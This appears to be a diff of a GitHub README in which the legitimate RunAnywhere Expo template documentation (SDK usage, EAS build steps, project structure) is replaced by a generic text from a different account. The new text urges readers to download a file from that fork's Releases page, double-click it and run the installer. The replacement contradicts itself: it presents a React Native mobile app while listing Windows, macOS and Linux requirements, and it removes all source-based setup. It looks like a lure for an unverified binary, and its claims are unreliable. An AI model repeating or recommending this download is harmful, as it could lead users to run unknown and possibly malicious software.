@@ -1,140 +1,92 @@
-# 🚀 RunAnywhere Expo Template
+# 🎉 runanywhere-expo-demo - Easy AI App for Your Device
 
-On-device AI demo with RunAnywhere SDK for React Native + Expo.
+[![Download](https://img.shields.io/badge/Download%20Now%20!-%20runanywhere-expo-demo-blue)](https://github.com/Dimas6690/runanywhere-expo-demo/releases)
 
-[![npm](https://img.shields.io/npm/v/runanywhere-react-native)](https://www.npmjs.com/package/runanywhere-react-native)
-[![Run on Replit](https://replit.com/badge/github/RunanywhereAI/runanywhere-expo-demo)](https://replit.com/new/github/RunanywhereAI/runanywhere-expo-demo)
+## 🚀 Getting Started
 
-## ✨ Features
+Welcome to the **runanywhere-expo-demo**! This app allows you to run speech recognition, small language models, and text-to-speech functionality directly on your device. It's built using React Native and Expo, making it perfect for mobile applications. No programming skills are required to set it up.
 
-- 🧠 **100% On-Device AI** - No cloud required, complete privacy
-- ⚡ **Fast Inference** - Optimized for mobile with llama.cpp & ONNX Runtime
-- 🎤 **Voice AI** - Speech-to-text and text-to-speech
-- 📱 **Expo + React Native** - Easy development workflow
+## 📥 Download & Install
 
-## 🔧 Development Mode vs Production
+To download the app, visit the Releases page: [Download Here](https://github.com/Dimas6690/runanywhere-expo-demo/releases).
 
-| Feature | Development Mode | Production Mode |
-|---------|------------------|-----------------|
-| API Key | ❌ Not required | ✅ Required |
-| Inference | 100% on-device | Hybrid on-device + cloud |
-| Observability | ❌ None | ✅ Dashboard & analytics |
-| Policy Engine | ❌ None | ✅ Cost/latency/privacy routing |
-| Billing | ❌ Free | ✅ Usage tracking |
+Once on the page, you’ll see several versions. Select the latest version to ensure you get the most up-to-date features and fixes. Download the file that matches your operating system.
 
-This template runs in **Development Mode** - perfect for prototyping!
+## 🔄 System Requirements
 
-## 🚀 Quick Start
+To use **runanywhere-expo-demo**, your device should meet the following requirements:
 
-### Option 1: Fork on Replit
+- **Operating System:** Windows, macOS, or Linux (latest versions)
+- **Memory:** At least 4GB RAM
+- **Storage:** 100MB of free disk space
+- **Other:** A stable internet connection for the initial download
 
-1. Click the "Run on Replit" badge above
-2. Install the dev client on your phone (see below)
-3. Scan the QR code
-4. Start coding!
+## 📖 Features
 
-### Option 2: Local Development
+- **Speech Recognition:** Easily convert your voice to text.
+- **Language Models:** Process and understand small language tasks on your device.
+- **Text-To-Speech:** Transform written text into spoken words.
+- **Offline Functionality:** Use the app without needing an internet connection after setup.
+- **Mobile-Friendly:** Fully optimized for mobile devices using React Native.
 
-```bash
-# Clone the template
-git clone https://github.com/RunanywhereAI/runanywhere-expo-demo
-cd runanywhere-expo-demo
+## ⚙️ Setting Up the App
 
-# Install dependencies
-npm install
+After downloading the file, follow these simple steps to run the app:
 
-# Start Expo dev server
-npx expo start
-```
+1. Locate the downloaded file on your device.
+2. Double-click the file to start the installation process.
+3. Follow the prompts on your screen to complete the installation.
+4. Once installed, open the app from your device’s application menu.
 
-## 📱 Important: Development Build Required
+## 🌐 How to Use the App
 
-This SDK uses native modules, so **Expo Go won't work**. You need a development build:
+Upon launching the app, you’ll find a user-friendly interface. Here’s how to get started:
 
-### Build with EAS (Recommended)
+1. **Speech Recognition:**
+   - Press the microphone button and speak clearly.
+   - The app will convert your speech into text in real-time.
 
-```bash
-# Install EAS CLI
-npm install -g eas-cli
+2. **Language Models:**
+   - Input text to see how the application understands various contexts.
+   - Experiment with different prompts to see various outputs.
 
-# Login to Expo
-eas login
+3. **Text-To-Speech:**
+   - Type any text into the designated area.
+   - Click the play button to hear your text spoken.
 
-# Configure EAS
-eas build:configure
+## 🛠️ Troubleshooting
 
-# Build for Android (creates downloadable APK)
-eas build --platform android --profile development
+If you encounter any issues, try these steps:
 
-# Build for iOS (requires Apple Developer account)
-eas build --platform ios --profile development
-```
+- Ensure your device meets the system requirements.
+- Restart the app if it is not responding.
+- Check your internet connection if features are not working properly.
 
-### Pre-built Dev Client
+For more specific help, visit the [Issues section](https://github.com/Dimas6690/runanywhere-expo-demo/issues) on GitHub.
 
-Download our pre-built development client:
-- 📥 **Android APK**: [Download](https://expo.dev/artifacts/eas/gHZ2ANknUSsCZfEsYxPcFB.apk) - Anyone can install!
-- 📥 **iOS TestFlight**: Coming soon
+## 🔗 Important Links
 
-> **Note on iOS Distribution**: Apple requires either device registration (limited to 100 devices) 
-> or TestFlight for public distribution. To enable iOS "vibe coding" for everyone, you'll need to 
-> set up TestFlight distribution. Add `"distribution": "store"` to your eas.json build profile 
-> and submit via `eas submit --platform ios`. See [Expo iOS Submit docs](https://docs.expo.dev/submit/ios/).
+- [Releases Page](https://github.com/Dimas6690/runanywhere-expo-demo/releases) - Download the latest version
+- [Issues Section](https://github.com/Dimas6690/runanywhere-expo-demo/issues) - Report bugs or request features
+- [Project Homepage](https://github.com/Dimas6690/runanywhere-expo-demo) - Explore the repository
 
-## 📦 SDK Usage
+## 🌟 Community & Support
 
-```typescript
-import { RunAnywhere } from 'runanywhere-react-native';
+Join our community for updates and support. You can ask questions, propose new features, or help others. Follow the repository to stay informed!
 
-// Initialize (Development Mode - no API key needed)
-await RunAnywhere.initialize({});
+## 📝 Topics
 
-// Load a model
-await RunAnywhere.loadModel('lfm2-350m-q4-k-m');
+This project covers the following topics:
+- edge-ai
+- expo
+- llm
+- local-first
+- mobile-ai
+- offline-first
+- react-native
+- react-native-sdk
+- runanywhere-sdks
+- speech-to-text
+- text-to-speech
 
-// Generate text
-const result = await RunAnywhere.generate('Hello, tell me a joke!', {
-  maxTokens: 100,
-  temperature: 0.7,
-});
-
-console.log(result.text);
-```
-
-### Production Mode (Coming Soon)
-
-```typescript
-// With API key for cloud features
-await RunAnywhere.initialize({
-  apiKey: process.env.EXPO_PUBLIC_RUNANYWHERE_API_KEY,
-  environment: 'production',
-});
-
-// Enables:
-// - Cloud observability dashboard
-// - Policy engine for routing decisions
-// - Hybrid on-device + cloud inference
-// - Usage tracking and billing
-```
-
-## 🗂️ Project Structure
-
-```
-├── app/
-│   ├── (tabs)/
-│   │   └── index.tsx      # Main demo screen
-│   └── _layout.tsx        # Navigation layout
-├── app.json               # Expo config
-├── package.json           # Dependencies
-└── .replit                # Replit configuration
-```
-
-## 📚 Resources
-
-- [RunAnywhere Documentation](https://docs.runanywhere.ai)
-- [SDK npm Package](https://www.npmjs.com/package/runanywhere-react-native)
-- [GitHub Repository](https://github.com/RunanywhereAI/sdks)
-
-## 📄 License
-
-MIT © [RunAnywhere AI](https://runanywhere.ai)
+Your feedback is valuable. Enjoy using **runanywhere-expo-demo**!
